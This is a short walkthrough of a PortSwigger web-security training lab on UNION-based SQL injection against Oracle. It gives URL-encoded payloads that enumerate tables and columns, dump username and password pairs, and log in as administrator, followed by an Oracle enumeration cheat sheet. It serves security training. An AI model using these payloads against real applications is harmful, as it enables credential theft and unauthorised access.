# Lab 10 — SQL injection attack, listing the database contents on Oracle

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

**Entry point:** `GET /filter?category=`

## Goal

Enumerate an Oracle schema via `all_tables` / `all_tab_columns`, dump
credentials, and log in as `administrator`.

## Solution

1. Confirm **2 columns**, second is text:

```
'+UNION+SELECT+NULL,'a'--
```

2. Oracle has no `information_schema`. List user tables:

```
'+UNION+SELECT+NULL,table_name+FROM+all_tables--
```

Find the random-suffixed credentials table, e.g. `USERS_XXXXXX`.

3. List its columns:

```
'+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+table_name='USERS_XXXXXX'--
```

→ Oracle column names are **uppercase**, e.g. `USERNAME_XXXXXX`,
`PASSWORD_XXXXXX`.

4. Dump and concatenate in one text column:

```
'+UNION+SELECT+NULL,USERNAME_XXXXXX||':'||PASSWORD_XXXXXX+FROM+USERS_XXXXXX--
```

5. Log in as `administrator` — lab solved.

## Oracle enumeration cheat sheet

| What | Query |
|------|-------|
| Version | `SELECT banner FROM v$version` |
| Tables | `SELECT table_name FROM all_tables` |
| Columns | `SELECT column_name FROM all_tab_columns WHERE table_name='...'` |
| Current user | `SELECT user FROM dual` |
